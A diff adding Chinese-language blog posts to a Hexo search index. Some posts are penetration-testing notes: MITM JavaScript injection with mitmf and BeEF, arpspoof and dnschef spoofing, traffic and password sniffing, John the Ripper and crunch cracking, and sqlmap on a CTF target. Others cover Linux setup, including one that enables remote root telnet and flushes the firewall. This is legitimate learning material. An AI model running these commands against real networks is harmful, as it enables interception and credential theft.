+  <entry>
+    <title><![CDATA[mitmf使用实行中间人xss攻击]]></title>
+    <url>%2F2020%2F07%2F11%2Fmitmf%E4%BD%BF%E7%94%A8%E5%AE%9E%E8%A1%8C%E4%B8%AD%E9%97%B4%E4%BA%BAxss%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[下载mitmfapt-get install mitmfkali2.0以上默认没有mitmf软件，kali1.0有mitmif。blackarch集成mitmf，推荐使用。 mitmf实行xss攻击启动beefcd /usr/share.beef/目录下，./beef启动beef默认账号密码都为beef使用arp欺骗，插入js脚本，实现xss攻击可以看到网页源码已经插入js脚本了 mitmf键盘记录器mitmf网页图片倒置（恶作剧） mitmf cookie显示]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Metagoofil]]></title>
+    <url>%2F2020%2F07%2F11%2FMetagoofil%E7%9A%84%E4%BD%BF%E7%94%A8%2F</url>
+    <content type="text"><![CDATA[Metagoofil是由Christian Martorella编写的功能强大的元数据手机工具。它可以自动在搜素引擎中检索和分析文件，还具有提供Mac地址，用户名列表等其他功能。 参数 描述， -d 所搜寻的域名。 -t 要下载的文档类型（pdf，doc，docx，ppt，xls，ods等） -l 搜索结果限制（默认200个） -h 使用目录中的文档处理（”yes”表示本地分析） -n 文件下载限制 -o 工作目录 -f 输出文件 #metagoofil -d baidu.com -l 20 -t doc,pdf -n 5 -f test.html -o test #metagoofil -d wenku.baidu.com -t doc,xls -l 200 -n 50 -o metafiles -f metaResult.html]]></content>
+      <tags>
+        <tag>渗透测试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[markdown语法]]></title>
+    <url>%2F2020%2F07%2F11%2Fmarkdown%E8%AF%AD%E6%B3%95%E7%AE%80%E7%95%A5%E6%89%8B%E5%86%8C%2F</url>
+    <content type="text"><![CDATA[1. 斜体和粗体*斜体* //斜体 **粗体** //粗体 2. 分级标题用#——#####以”#”的个数进行逐级分级，1-5级;用h1——h5逐级分级 3. 外链接使用 [描述](链接地址) 为文字增加外链接 5.段落和换行 第一种写法：直接敲两个回车键即可 第二种写法:在写完一段后敲两个空格，然后回车写下一段 第三种写法:&lt;br /&gt;作为换行，然后写下一段6.分隔线&amp;引言` === ` 引言&gt;加___ 还有一种写法就是每一行都用一个 “&gt;” 号&lt;br&gt;&gt; &gt; 另外一种就是嵌套引用 7.列表 无序列表无序列表可以在每行开头用星号、加号、减号来表示，也可以三者混合一起，推荐使用相同的字符，避免混乱 有序列表有序列表用数字接着一个英文句点来表示，数字可无序，但还是推荐使用1.、2.，避免混乱。 8.代码代码块用两个这种符号围住 用`（语言）把代码起始行末尾行围住用tap键 9.更多阅读&lt;!--more--&gt;]]></content>
+      <tags>
+        <tag>item</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux系统安全配置]]></title>
+    <url>%2F2020%2F07%2F11%2Flinux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE%2F</url>
+    <content type="text"><![CDATA[用户管理1.删除系统特殊的用户账号和组账号查看系统所有用户名cat /etc/passwd删除用户jaie命令userdel jaie 2.用户密码设置编辑login.defs文件vim /etc/login.defs 3.修改自动注销账户的时间编辑profilevim /etc/profile修改“HISTSIZE”参数的值，即注销等待时间 4.给系统用户名密码存放文件加锁，防止非授权用户获得权限用chattr命令防止系统中某个关键文件被修改:chattr +i /etc/passwd 系统管理配置1.关闭系统不必要的服务cd /etc/init.d/目录下，使用mv命令把init.d下改为*.old类的文件名，目的是让系统启动时找不到这个服务的文件 2.修改init.d目录执行权限，防止修改 3.给系统服务端口列表文件加锁防止未经许可的删除或添加服务 4.修改ssh服务端口vi /etc/ssh/ssh_config把port前的#去掉，并修改端口号，保存退出。重启shh服务 5.修改部分系统文件的SUID和SGID的权限权限为SUID和SGID的执行文件，在程序运行过程中，会给进程所有者权限，如果被黑客利用就会给系统造成危害。修改chage文件的权限 6.日志管理使用dmesg查看系统引导日志cd /var/log/在log中可以看到一些的日志文件，修改这些日志的权限可以防止不相干的人修改。 lastlog记录用户最后一次成功登录时间 loginlog不良的登录尝试记录 messages 记录输出系统主控台以及由syslog系统服务程序产生的消息 utmp记录当前当前登录得每个用户 utmp扩展得utmp wtmp 记录每一次用户登陆和注销的历史消息 wtmpx 扩展的wtmp vold.log记录使用外部介质出现的错误 xferkig记录ftp的存取情况 sulog记录su命令的使用情况 acct记录每个用户使用过的命令 aculog拔出移动呼叫记录 XFree86.0.log记录Xfree86 Xwindows服务器最后一次执行的结果文件数字带有.1,.2,.3…文件为轮询日志文件。数字越大，日志越老]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux搭建DNS服务器]]></title>
+    <url>%2F2020%2F07%2F11%2Flinux%E6%90%AD%E5%BB%BADNS%E6%9C%8D%E5%8A%A1%E5%99%A8%2F</url>
+    <content type="text"><![CDATA[一.远程登陆&amp;配置yum源下载xshell 安装打开,输入虚拟机ip地址,默认端口号22,然后填账号(root),密码,登陆成功. 配置yum源cd /etc/yum.repos.d/ //进入/etc/repo目录 vim web163.repo //新建yum源文件 配置的网易的yum源(可粘贴复制)32位的系统选这个 [wed163] name=wed baseurl=https://mirrors.163.com/centos/6/os/i386/ mediaid=1384196515.415715 metadata_expire=-1 gpgcheck=1 cost=500 enabled=1 gpgkey=https://mirrors.163.com/centos/6/os/i386/RPM-GPG -KEY-CentOS-6 64位系统选这个 [wed163] name=wed baseurl=https://mirrors.163.com/centos/6/os/x86_64/ mediaid=1384196515.415715 metadata_expire=-1 gpgcheck=1 cost=500 enabled=1 gpgkey=https://mirrors.163.com/centos/6/os/x86_64/RPM-GPG-KEY-CentOS-6 保存退出,下面清理yum缓存且进行测试 clean yum all //清除缓存 clean yum makecache //重新下载缓存 yum repolist //查看yum安装包数量 安装dns,配置dns安装dns,安装成功即可进行下一步yum install bind -y //安装dns(即bind),-y确认 rpm -qa|grep bind //查看bind是否安装成功有bind的相关 配置dns配置主配置文件 named.confcd /etc/ ls named* //查看named相关配置文件 可ka看到named.conf即dns主配置文件 vim /etc/named.conf //编辑主配置文件 如下图所示,进行部分修改,把这三项修改就保存退出 配置正向解析区域vim /etc/named.rfc1912.zones 进行添加解析,修改如图所示.在下面的第二图中,我添加的是”jaie32.com”,这里可以修改成你自己喜欢的域名 ####配置正向区域数据库文件 cd /var/named/ //进入配置目录 ls //查看目录文件 cp -p named.empty jaie32.com.zone //完成复制named.empty文件命名jaie32.com vim jaie32.com.zone //编辑文件,并进行一些修改改如下图所示,完成保持退出 这里的IP地址是自己主机地址,使用ifconfig命令可查看 ###修改主机dns服务器位自己的ip vim /etc/resolv.conf //打开之后修改如下图所示 ####到这里配置基本完成了,下面重启服务 service named restart //重启dns服务 测试dns方法一:ping自己域名(推荐,简单方便)ping www.jaie32.com //可以看到自己的ip,ping通即成功 方法二:nslookup命令nslookup //输入nslookup,然后输入自己的域名如图所示 方法三:dig命令测试dig www.jaie32.com //dig 域名 安装web服务器测试yum install httpd -y //安装web服务器包 service httpd start //启动web服务 然后再打开虚拟机服务器,打开浏览器,输入域名.结果如图所示]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux opendssh 升级]]></title>
+    <url>%2F2020%2F07%2F11%2Flinux%20opendssh%20%E5%8D%87%E7%BA%A7%2F</url>
+    <content type="text"><![CDATA[1.在工作中遇到openshh升级问题，因为客户那边是内网很难搞，要升级openshh要装依赖，客户那边又不能联网，所以我在自己笔记本本地搭建了一个yum服务器，供客户那边linux下载软件包，然后openssh开启中途可能ssh服务不能用，解决这些问题后，我想到开启telnet服务，以防万一，万一Linux不能连接，客户不得拿刀砍我，， 1.开始工作查看系统版本、查看openssh版本，下载openssh最新包我这里是openshh8.0shh -V查看openssh版本，rpm -qa|grep openssh查看openssh相关包2.安装必要软件cp /etc/init.d/sshd /etc/init.d/sshd.bak备份下sshd文件yum -y install gcc pam pam-devel zlib zlib-devel openssl-devel3.安装openshh卸载旧的openssh rpm -e `rpm -qa | grep openssh` --nodeps解压openssh安装包tar -zxvf openssh-8.0p1.tar_2.gz./configure --prefix=/usr --sysconfdir=/etc/ssh --with-md5-passwords --with-zlib --with-ssl-dir=/usr/local/ssl --with-privsep-path=/var/lib/sshd ```make install 安装完成如果遇到报错chmod 600 /etc/ssh/ssh_host_*输入这些命令`install -v -m755 contrib/ssh-copy-id /usr/bin install -v -m644 contrib/ssh-copy-id.1 /usr/share/man/man1 install -v -m755 -d /usr/share/doc/openssh-8.0p1 install -v -m644 INSTALL LICENCE OVERVIEW README* /usr/share/doc/openssh-8.0p1ssh -V测试一下现在的版本是多少了，openssh 8.0了]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[linux开启配置telnet]]></title>
+    <url>%2F2020%2F07%2F11%2Flinux%E5%BC%80%E5%90%AF%E9%85%8D%E7%BD%AEtelnet%2F</url>
+    <content type="text"><![CDATA[1.安装telnet的必要软件yum install telnet telnet-server xinetd -y下载telnet、telnet、xinetd三个软件.2.修改xinetd配置文件vim /etc/xinetd.d/telnet把disable = no 从yes改为no3.配置允许root登录方法一：vim /etc/pam.d/login把修改 account required pam_nologin.so注释掉方法二：mv /etc/securetty /etc/securetty.bak移除securetty文件 验证规则设置在/etc/security文件中，该文件定义root用户只能在tty1-tty6的终端上记录，删除该文件或者将其改名即可避开验证规则实现root用户远程登录。4.重启服务本地测试service xinetd restart重新启动xinetd服务在本机telnet自己，telnet 127.0.0.1 root用户登录成功 iptables -F关闭防火墙远程成功登录]]></content>
+      <categories>
+        <category>linux</category>
+      </categories>
+      <tags>
+        <tag>linux</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[使用john破解密码]]></title>
+    <url>%2F2020%2F07%2F11%2Fjohn%E7%A0%B4%E8%A7%A3%E5%AF%86%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[john Created directory: /root/.john John the Ripper password cracker, version 1.8.0.6-jumbo-1-bleeding [linux-x86-64-avx] Copyright (c) 1996-2015 by Solar Designer and others Homepage: http://www.openwall.com/john/ Usage: john [OPTIONS] [PASSWORD-FILES] --single[=SECTION] &quot;single crack&quot; mode --wordlist[=FILE] --stdin wordlist mode, read words from FILE or stdin --pipe like --stdin, but bulk reads, and allows rules --loopback[=FILE] like --wordlist, but fetch words from a .pot file --dupe-suppression suppress all dupes in wordlist (and force preload) --prince[=FILE] PRINCE mode, read words from FILE --encoding=NAME input encoding (eg. UTF-8, ISO-8859-1). See also doc/ENCODING and --list=hidden-options. --rules[=SECTION] enable word mangling rules for wordlist modes --incremental[=MODE] &quot;incremental&quot; mode [using section MODE] --mask=MASK mask mode using MASK --markov[=OPTIONS] &quot;Markov&quot; mode (see doc/MARKOV) --external=MODE external mode or word filter --stdout[=LENGTH] just output candidate passwords [cut at LENGTH] --restore[=NAME] restore an interrupted session [called NAME] --session=NAME give a new session the NAME --status[=NAME] print status of a session [called NAME] --make-charset=FILE make a charset file. It will be overwritten --show[=LEFT] show cracked passwords [if =LEFT, then uncracked] --test[=TIME] run tests and benchmarks for TIME seconds each --users=[-]LOGIN|UID[,..] [do not] load this (these) user(s) only --groups=[-]GID[,..] load users [not] of this (these) group(s) only --shells=[-]SHELL[,..] load users with[out] this (these) shell(s) only --salts=[-]COUNT[:MAX] load salts with[out] COUNT [to MAX] hashes --save-memory=LEVEL enable memory saving, at LEVEL 1..3 --node=MIN[-MAX]/TOTAL this node&#39;s number range out of TOTAL count --fork=N fork N processes --pot=NAME pot file to use --list=WHAT list capabilities, see --list=help or doc/OPTIONS --format=NAME force hash of type NAME. The supported formats can be seen with --list=formats and --list=subformats 破解linux密码显示已完成破解的密码文件john破解缓存文件夹 john破解windows密码显示破解的密码 john的图形化界面——johnnyjohnny破解linux密码]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[Hello World]]></title>
-    <url>%2F2019%2F03%2F06%2Fhello-world%2F</url>
+    <url>%2F2020%2F07%2F11%2Fhello-world%2F</url>
     <content type="text"><![CDATA[Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick StartCreate a new post$ hexo new &quot;My New Post&quot; More info: Writing Run server$ hexo server More info: Server Generate static files$ hexo generate More info: Generating Deploy to remote sites$ hexo deploy More info: Deployment]]></content>
+  </entry>
+  <entry>
+    <title><![CDATA[hash_identifier和Hashid猜测识别加密算法]]></title>
+    <url>%2F2020%2F07%2F11%2Fhash_identifier%E5%92%8CHashid%E7%8C%9C%E6%B5%8B%E8%AF%86%E5%88%AB%E5%8A%A0%E5%AF%86%E7%AE%97%E6%B3%95%2F</url>
+    <content type="text"><![CDATA[1.hash-identifier2.hashid]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[dnschefDNS欺骗]]></title>
+    <url>%2F2020%2F07%2F11%2FDNS%E6%AC%BA%E9%AA%97%2F</url>
+    <content type="text"><![CDATA[dnschef –fakeip=192.168.200.2 –fakedomains=www.baidu.com,www.qq.com –interface 192.168.200.243 -qfackip欺骗到指定的ip，facedomains欺骗域名window修改dns服务器]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>中间人攻击</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[crunch创建密码字典]]></title>
+    <url>%2F2020%2F07%2F11%2Fcrunch%E5%88%9B%E5%BB%BA%E5%AF%86%E7%A0%81%2F</url>
+    <content type="text"><![CDATA[crunch &lt;min-len&gt; &lt;max-len&gt; [&lt;charset string&gt;] [options] – &lt;charset string&gt;默认是小写字符 crunch 6 6 0123456789 -o START -d 2 -b 1mb / -c 100 – -b 按大小分割字典文件（kb/kib、mb/mib、gb/gib） – -c 每个字典的行数 – 以上两个参数必须与-o START 结合使用 – -d 同一字符连贯出现数量（11 / aaa) /usr/share/crunch/charset.lst crunch 内置字符文件 使用crunch 内置字符文件字符集hex-lower创建字典 crunch 1 1 -p 1234567890 | more -p参数指定字符串对对其所有排序组合列车，此命令意思是对1234567890列出这10个数字所有排列组合。其前面的指定密码长度无效 字典组成规则 – crunch 6 6 -t @,%%^^ | more– @：小写字母 lalpha –— ,：大写字母 ualpha– %:数字 numeric– ^:符号 symbols 输出文件压缩 – crunch 4 4 -t @,%^ -o 1.txt -z 7z –其他压缩格式：gzip、bzip2、lzma – 7z压缩比率最大]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>密码破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[Bugku-web题，ctf模拟题sql注入神奇的登陆框]]></title>
+    <url>%2F2020%2F07%2F11%2FBugku-web%E9%A2%98%EF%BC%8Cctf%E6%A8%A1%E6%8B%9F%E9%A2%98sql%E6%B3%A8%E5%85%A5%E7%A5%9E%E5%A5%87%E7%9A%84%E7%99%BB%E9%99%86%E6%A1%86%2F</url>
+    <content type="text"><![CDATA[这是Bugku-web题，地址为http://123.206.87.240:9001/sql/登陆网站，打开burp进行截断，账号密码随便打，burp截取后进行保存。使用sqlmap自动注入，可以发现数据库版本，数据库名使用sqlmap自动注入，发现表名flag1使用sqlmap自动注入，查看表flag1中列flag1的值使用sqlmap自动注入，可以列flag1的值]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>web破解</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title><![CDATA[arp攻击]]></title>
+    <url>%2F2020%2F07%2F11%2Farp%E6%94%BB%E5%87%BB%2F</url>
+    <content type="text"><![CDATA[arpspoof -h Version: 2.4 Usage: arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host aspspoof -t 被攻击ip -r 网关ip然后可以看到winows主机的arp表的变化这时所有的windows通过网关都会转到kali上，所以被攻击无网络服务了。kali开启路由转发，echo 1 &gt; /proc/sys/net/ipv4/ip_forward此时windows就可以上网了，但是所有的流量都经过kali进行转发。利用kali网卡wireshark进行抓包driftnet抓取目标机数据图片创建arotemp目录存放数据图片音频信息，driftnet -i eth0 -a -d arptemp -s-i 选择接口 -a 数据存放目录 -d 指定目录-s 抓取音频仅支持MOEG获取目标浏览url信息urlsnarf -i eth0dsniff 对目标密码进行捕获，]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+      <tags>
+        <tag>中间人攻击</tag>
+      </tags>
   </entry>
 </search>
